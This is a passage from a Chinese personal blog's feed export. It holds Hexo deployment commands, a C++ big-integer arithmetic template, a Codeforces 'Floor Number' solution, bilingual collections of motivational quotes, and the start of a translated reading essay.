class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>最后，在GitHub上面提交public文件即可完成部署。</p><p>图片演示（可跳过）：</p><p><img src="/img/cursor7.png"></p><p><code>hexo g -d</code> 和 <code>hexo d</code>与上图同理，不再用图片演示。 </p><h4 id="Okay-you-success！"><a href="#Okay-you-success！" class="headerlink" title="Okay, you success！"></a>Okay, you success！</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hexo-butterfly主题利用css部署网站鼠标指针样式&quot;&gt;&lt;a href=&quot;#hexo-butterfly主题利用css部署网站鼠标指针样式&quot; class=&quot;headerlink&quot; title=&quot;hexo+butterfly主题利用css部署网站鼠标指针样</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="https://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>高精度板子</title>
    <link href="https://touristdaughter.cyou/2024/02/20/%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E6%9D%BF%E5%AD%90/"/>
    <id>https://touristdaughter.cyou/2024/02/20/%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95%E7%9A%84%E6%9D%BF%E5%AD%90/</id>
    <published>2024-02-20T11:12:31.017Z</published>
    <updated>2025-04-29T22:36:48.149Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、高精度算法"><a href="#一、高精度算法" class="headerlink" title="一、高精度算法"></a>一、高精度算法</h1><blockquote><p>high-precision algorithm</p></blockquote><p>大数的计算，基本只在C++中需要用到，Java中有类 不需要高精算法，而python中默认有无数个位数 因此也不用。<br>Calculation of large numbers. Basically, it is only needed in C++. In Java, there are large number classes that do not require high precision algorithms, while in Python, there are countless digits by default, so it is not necessary.</p><h1 id="二、高精度算法的板子"><a href="#二、高精度算法的板子" class="headerlink" title="二、高精度算法的板子"></a>二、高精度算法的板子</h1><blockquote><p>Template for high-precision algorithms</p></blockquote><p><code>AC由心而生</code><br><code>The idea of writing the right code always comes from a clear heart.</code></p><h2 id="代码-C-Code"><a href="#代码-C-Code" class="headerlink" title="代码(C++ Code)"></a>代码(C++ Code)</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A,vector&lt;<span class="type">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt; B.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(A[i] != B[i])</span><br><span class="line"><span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A,vector&lt;<span class="type">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//C从后往前遍历是答案</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line"><span class="type">int</span> s=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; A.<span class="built_in">size</span>()|| i &lt; B.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i &lt; A.<span class="built_in">size</span>()) s += A[i];</span><br><span class="line"><span class="keyword">if</span>(i &lt; B.<span class="built_in">size</span>()) s += B[i];</span><br><span class="line">C.<span class="built_in">push_back</span>(s % <span class="number">10</span>);</span><br><span class="line">s /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(s) C.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> C;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A,vector&lt;<span class="type">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//用法：</span></span><br><span class="line"><span class="comment">// vector&lt;int&gt; C;</span></span><br><span class="line"><span class="comment">// if(!cmp(A,B)) cout&lt;&lt;&quot;-&quot;,C = sub(B,A);</span></span><br><span class="line"><span class="comment">// else C = sub(A,B);</span></span><br><span class="line"><span class="comment">// C从后往前遍历是答案</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>,s = <span class="number">0</span>;i &lt; A.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="comment">//s表示借位</span></span><br><span class="line">s = A[i] - s;</span><br><span class="line"><span class="keyword">if</span>(i &lt; B.<span class="built_in">size</span>()) s -= B[i];</span><br><span class="line">C.<span class="built_in">push_back</span>((s + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span>(s &lt; <span class="number">0</span>) s = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> s = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">C.<span class="built_in">pop_back</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A,vector&lt;<span class="type">int</span>&gt; &amp;B)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// C从后往前遍历是答案</span></span><br><span class="line"><span class="type">int</span> mx=<span class="built_in">max</span>(A.<span class="built_in">size</span>(),B.<span class="built_in">size</span>()) + <span class="number">1</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">C</span><span class="params">(<span class="number">2</span> * mx)</span>,PC</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; A.<span class="built_in">size</span>();i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; B.<span class="built_in">size</span>();j++) </span><br><span class="line">C[i+j] += A[i] * B[j];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; A.<span class="built_in">size</span>() + B.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">C[i + <span class="number">1</span>] += C[i] / <span class="number">10</span>;</span><br><span class="line">C[i] = C[i] % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = A.<span class="built_in">size</span>() + B.<span class="built_in">size</span>() - <span class="number">1</span>;i &gt;= <span class="number">1</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(C[i]) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j &lt;= i;j++)&#123;</span><br><span class="line">PC.<span class="built_in">push_back</span>(C[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> PC;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">div</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A,<span class="type">int</span> b,<span class="type">int</span> &amp;r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//高精度除只能做到一个大数除以一个小数</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">r = r * <span class="number">10</span> + A[i];</span><br><span class="line">C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">r = r % b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//algorithm头文件</span></span><br><span class="line"><span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(),C.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">while</span>(C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line"><span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string a,b;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">vector &lt;<span class="type">int</span>&gt; A,B,C;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">cmp</span>(A,B)) cout &lt;&lt; <span class="string">&quot;-&quot;</span>,C = <span class="built_in">sub</span>(B,A);</span><br><span class="line"><span class="keyword">else</span> C = <span class="built_in">sub</span>(A,B);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--) cout &lt;&lt; C[i];</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、高精度算法&quot;&gt;&lt;a href=&quot;#一、高精度算法&quot; class=&quot;headerlink&quot; title=&quot;一、高精度算法&quot;&gt;&lt;/a&gt;一、高精度算法&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;high-precision algorithm&lt;/p&gt;
&lt;/blockq</summary>
      
    
    
    
    <category term="编程与算法设计(ACM、OI)" scheme="https://touristdaughter.cyou/categories/%E7%BC%96%E7%A8%8B%E4%B8%8E%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1-ACM%E3%80%81OI/"/>
    
    
    <category term="Algorithm" scheme="https://touristdaughter.cyou/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Quotes on Attitudes</title>
    <link href="https://touristdaughter.cyou/2024/01/30/Quotes%20on%20Attitudes/"/>
    <id>https://touristdaughter.cyou/2024/01/30/Quotes%20on%20Attitudes/</id>
    <published>2024-01-30T07:20:41.999Z</published>
    <updated>2024-04-04T16:49:35.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Quotes-on-Attitudes"><a href="#Quotes-on-Attitudes" class="headerlink" title="Quotes on Attitudes"></a>Quotes on Attitudes</h1><blockquote><p>本文来源：<a href="https://seagull.baicizhan.com/react_reading/reading/article/2921?buid=2124144499&recording=null&timestamp=1706599359000">https://seagull.baicizhan.com/react_reading/reading/article/2921?buid=2124144499&amp;recording=null&amp;timestamp=1706599359000</a></p></blockquote><p>There is only one heroism in the world: to see the world as it is, and to love it.<br>—Roman Roland<br>世上唯有一种英雄主义：在认清世界真相后，依然热爱世界。</p><p>——罗曼·罗兰</p><p>To love oneself is the beginning of a lifelong romance.<br>—Oscar Wilde<br>爱自己是终生浪漫的开始。</p><p>——奥斯卡·王尔德</p><p>Happiness, not in another place but this place…not for another hour, but this hour.<br>―Walt Whitman<br>幸福，不在别处，而在此处……不在彼时，而在此时。</p><p>——沃尔特·惠特曼</p><p>Attitude is a choice. Happiness is a choice. Optimism is a choice. Kindness is a choice. Giving is a choice. Respect is a choice. Whatever choice you make makes you. Choose wisely.<br>态度是一种选择。幸福是一种选择。乐观是一种选择。仁慈是一种选择。给予是一种选择。尊重是一种选择。你做的所有选择塑造着你。所以要做明智之选。</p><p>The age of a woman is not important: you can be wonderful in your 20’s, amazing in your 40’s and stay fabulous for the rest of your life.<br>—Coco Chanel<br>女人的年龄并不重要：你可以在20多岁时变得优秀，在40多岁时变得出色，在余生保持光彩耀人。</p><p>——可可·香奈儿</p><p><img src="/img/chosse_wisely.jpg"></p><p>Yesterday is gone. Tomorrow has not yet come. We have only today. Let us begin.<br>―Mother Teresa<br>昨日已逝，明日未到，我们只有今日，让我们从现在开始吧！</p><p>——特蕾莎修女</p><p>Forgiveness is the fragrance that the violet sheds on the heel that has crushed it.<br>―Mark Twain<br>紫罗兰把香气留在了踩踏它的脚跟上，这就是宽恕。</p><p>——马克·吐温</p><p>The smile on my face doesn’t mean my life is perfect. It just means I appreciate everything I have.<br>我脸上的笑容并不意味着我拥有完美生活。而只意味着我感激我所拥有的一切。</p><p>Darkness cannot drive out darkness; only light can do that. Hate cannot drive out hate; only love can do that.<br>–Martin Luther King, Jr<br>黑暗不能驱逐黑暗，惟有光明可以；仇恨不能驱逐仇恨，惟有爱才可以。</p><p>——马丁·路德·金</p><p>If you look at what you have in life, you’ll always have more. If you look at what you don’t have in life, you’ll never have enough.<br>–Oprah Winfrey<br>如果你珍视生命中所拥有的，你会发现你已经拥有得够多；如果你执着于生命中未曾拥有的，你就算拥有再多也总是不够。</p><p>——奥普拉·温弗瑞</p><p>Life is like a camera. Just focus on what’s important, capture the good times, develop from the negatives, and if things don’t work out, just take another shot.<br>人生就像一台相机：聚焦重要事情，捕捉美好时光，在负面经历中成长，若结果不尽人意，那就再拍一次吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Quotes-on-Attitudes&quot;&gt;&lt;a href=&quot;#Quotes-on-Attitudes&quot; class=&quot;headerlink&quot; title=&quot;Quotes on Attitudes&quot;&gt;&lt;/a&gt;Quotes on Attitudes&lt;/h1&gt;&lt;bloc</summary>
      
    
    
    
    <category term="哲学、文学与艺术" scheme="https://touristdaughter.cyou/categories/%E5%93%B2%E5%AD%A6%E3%80%81%E6%96%87%E5%AD%A6%E4%B8%8E%E8%89%BA%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Floor Number</title>
    <link href="https://touristdaughter.cyou/2024/01/29/Floor%20Number/"/>
    <id>https://touristdaughter.cyou/2024/01/29/Floor%20Number/</id>
    <published>2024-01-29T06:39:30.525Z</published>
    <updated>2025-05-05T07:20:46.837Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：<a href="https://codeforces.com/contest/1426/problem/A">https://codeforces.com/contest/1426/problem/A</a></p></blockquote><h1 id="A-Floor-Number"><a href="#A-Floor-Number" class="headerlink" title="A. Floor Number"></a>A. Floor Number</h1><blockquote><p>time limit per test: 1 second<br>memory limit per test: 256 megabytes<br>input: standard input<br>output: standard output</p></blockquote><h3 id="Problem-description"><a href="#Problem-description" class="headerlink" title="Problem description"></a>Problem description</h3><p>Vasya goes to visit his classmate Petya. Vasya knows that Petya’s apartment number is n.</p><p>There is only one entrance in Petya’s house and the distribution of apartments is the following: the first floor contains 2 apartments, every other floor contains x apartments each. Apartments are numbered starting from one, from the first floor. I.e. apartments on the first floor have numbers 1 and 2, apartments on the second floor have numbers from 3 to (x+2), apartments on the third floor have numbers from (x+3) to (2⋅x+2), and so on.</p><p>Your task is to find the number of floor on which Petya lives. Assume that the house is always high enough to fit at least n apartments.</p><p>You have to answer t independent test cases.</p><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><p>The first line of the input contains one integer t (1≤t≤1000) — the number of test cases. Then t test cases follow.</p><p>The only line of the test case contains two integers n and x (1≤n,x≤1000) — the number of Petya’s apartment and the number of apartments on each floor of the house except the first one (there are two apartments on the first floor).</p><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><p>For each test case, print the answer: the number of floor on which Petya lives.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">7 3</span><br><span class="line">1 5</span><br><span class="line">22 5</span><br><span class="line">987 13</span><br></pre></td></tr></table></figure><h4 id="output"><a href="#output" class="headerlink" title="output"></a>output</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1</span><br><span class="line">5</span><br><span class="line">77</span><br></pre></td></tr></table></figure><h3 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h3><p>Consider the first test case of the example: the first floor contains apartments with numbers 1 and 2, the second one contains apartments with numbers 3, 4 and 5, the third one contains apartments with numbers 6, 7 and 8. Therefore, Petya lives on the third floor.</p><p>In the second test case of the example, Petya lives in the apartment 1 which is on the first floor.</p><h1 id="My-contest-submissions"><a href="#My-contest-submissions" class="headerlink" title="My contest submissions"></a>My contest submissions</h1><table><thead><tr><th>#</th><th>When</th><th>Who</th><th>Problem</th><th>Lang</th><th>Verdict</th><th>Time Memory</th></tr></thead><tbody><tr><td>175509632</td><td>Oct&#x2F;11&#x2F;2022 14:56UTC+8</td><td>JiangnanPsalter</td><td>A - Floor Number</td><td>GNU C++20 (64)</td><td>Accepted</td><td>15 ms0 KB</td></tr></tbody></table><h1 id="AC-Code"><a href="#AC-Code" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 师父是大魔王</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ll n, x;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; x;</span><br><span class="line">ll ans;</span><br><span class="line">ans = (n - <span class="number">2</span> + x) / x;</span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((n - <span class="number">2</span>) % x)</span><br><span class="line">cout &lt;&lt; ans + <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ll t;</span><br><span class="line">cin &gt;&gt; t;</span><br><span class="line"><span class="keyword">while</span> (t --) &#123;</span><br><span class="line"><span class="built_in">solve</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目来源：&lt;a href=&quot;https://codeforces.com/contest/1426/problem/A&quot;&gt;https://codeforces.com/contest/1426/problem/A&lt;/a&gt;&lt;/p&gt;
&lt;/blockqu</summary>
      
    
    
    
    <category term="我的基础算法笔记" scheme="https://touristdaughter.cyou/categories/%E6%88%91%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Quotes on Truth</title>
    <link href="https://touristdaughter.cyou/2024/01/29/Quotes%20on%20Truth/"/>
    <id>https://touristdaughter.cyou/2024/01/29/Quotes%20on%20Truth/</id>
    <published>2024-01-29T06:23:35.876Z</published>
    <updated>2024-04-04T16:49:45.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Quotes-on-Truth"><a href="#Quotes-on-Truth" class="headerlink" title="Quotes on Truth"></a>Quotes on Truth</h1><blockquote><p>本文来源：<a href="https://seagull.baicizhan.com/react_reading/reading/article/2924?buid=2124144499&recording=null&timestamp=1706509253000">https://seagull.baicizhan.com/react_reading/reading/article/2924?buid=2124144499&amp;recording=null&amp;timestamp=1706509253000</a></p></blockquote><p>A lie can travel halfway around the world while the truth is putting on its shoes.<br>―Mark Twain<br>谎言传遍半个地球的时候，真相还在穿鞋。</p><p>——马克·吐温</p><p>There is nothing noble in being superior to your fellow man; true nobility is being superior to your former self.<br>—Ernest Hemingway<br>优于别人并非高尚；今日之你优于昨日之你，才是真正的高尚。</p><p>——欧内斯特·海明威</p><p>Strong minds discuss ideas, average minds discuss events, weak minds discuss people.<br>大智论道，中智论事，小智论人。</p><p>Never argue with stupid people, they will drag you down to their level and then beat you with experience.<br>―Mark Twain<br>不要和愚蠢之人争辩，他们会把你拉低到他们的水平，然后用经验打败你。</p><p>——马克·吐温</p><p>Happiness always looks small while you hold it in your hands, but let it go, and you learn at once how big and precious it is.<br>―Maxim Gorky<br>你把幸福捧在手里，看似微不足道，但一旦放手，你便立刻感觉到它的重要与珍贵。</p><p>——马克西姆·高尔基</p><p>Behavior is the mirror in which everyone shows their image.<br>行为是面镜子，反射出每个人的真实自我。</p><p>Courage is what it takes to stand up and speak. Courage is also what it takes to sit down and listen.<br>–Winston Churchill<br>勇气是能站起来侃侃而谈。勇气也是能坐下来静静倾听。</p><p>——温斯顿·丘吉尔</p><p><img src="/img/grow.jpg"></p><p>Whenever you find yourself on the side of the majority, it is time to pause and reflect.<br>–Mark Twain<br>每当你发现自己和大多数人站在一边时，你就该停下来反思一下。</p><p>——马克·吐温</p><p>Nobody can hurt me without my permission.<br>—Mahatma Gandhi<br>没有人能不经我的允许伤害我。</p><p>——圣雄甘地</p><p>The two most important days in your life are the day you are born and the day you find out why.<br>—Mark Twain<br>人生中最重要的两个日子：出生那天和找到出生意义那天。</p><p>——马克·吐温</p><p>Hurt me with the truth. Don’t comfort me with a lie.<br>—Rihanna<br>宁愿用真相伤害我，也不要用谎言安慰我。</p><p>——蕾哈娜</p><p>It is our choices, that show what we truly are, far more than our abilities.<br>—J.K. Rowling<br>展现我们真正自我的不是我们的能力，而是我们的选择。</p><p>——J·K·罗琳</p><p>Once you’ve accepted your flaws, no one can use them against you.<br>—George R.R. Martin<br>只要你正视自己的弱点，就没人能利用它们来对付你。</p><p>——乔治·雷蒙德·理查德·马丁</p><p>There are rich people, and there are those who have money. They are not the same people.<br>—Coco Chanel<br>世上有富有的人，也有有钱的人。他们不是一类人。</p><p>——可可·香奈儿</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Quotes-on-Truth&quot;&gt;&lt;a href=&quot;#Quotes-on-Truth&quot; class=&quot;headerlink&quot; title=&quot;Quotes on Truth&quot;&gt;&lt;/a&gt;Quotes on Truth&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文来源：</summary>
      
    
    
    
    <category term="哲学、文学与艺术" scheme="https://touristdaughter.cyou/categories/%E5%93%B2%E5%AD%A6%E3%80%81%E6%96%87%E5%AD%A6%E4%B8%8E%E8%89%BA%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Stand Tall Like The Sunflower</title>
    <link href="https://touristdaughter.cyou/2024/01/26/Stand%20Tall%20Like%20The%20Sunflower/"/>
    <id>https://touristdaughter.cyou/2024/01/26/Stand%20Tall%20Like%20The%20Sunflower/</id>
    <published>2024-01-26T11:49:05.152Z</published>
    <updated>2024-04-04T16:50:34.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Stand-Tall-Like-The-Sunflower"><a href="#Stand-Tall-Like-The-Sunflower" class="headerlink" title="Stand Tall Like The Sunflower"></a>Stand Tall Like The Sunflower</h1><blockquote><p>本文来源：<a href="https://dolphin.baicizhan.com/react_reading/reading/article/2372?buid=2124144499&recording=null&timestamp=1706599455000">https://dolphin.baicizhan.com/react_reading/reading/article/2372?buid=2124144499&amp;recording=null&amp;timestamp=1706599455000</a></p></blockquote><p>My wife, daughter, and I moved into our home nine years ago and we spent a lot of time and energy in the yard to get it looking like the way it does today.<br>九年前，我和我的妻子、女儿搬到了现在的家，我们花了很多的时间和精力打理院子，让其变成了今天的模样。</p><p>We live on a corner, higher than street level, and the entire side of the yard is surrounded by a professionally built rock wall.<br>我们住在街角，高于街道的高度，院子的一边全部被修得整整齐齐的石墙围绕着。</p><p>The front of the house though is another story because instead of a wall along the sidewalk, the rocks appear to be just thrown up onto the dirt as if someone were in a hurry to finish．<br>房子的正面那边又是另一回事了，因为这并不是一段人行道，石块看起来像是被随意仍在泥土上，仿佛有人想要快点完成工作。</p><p>We 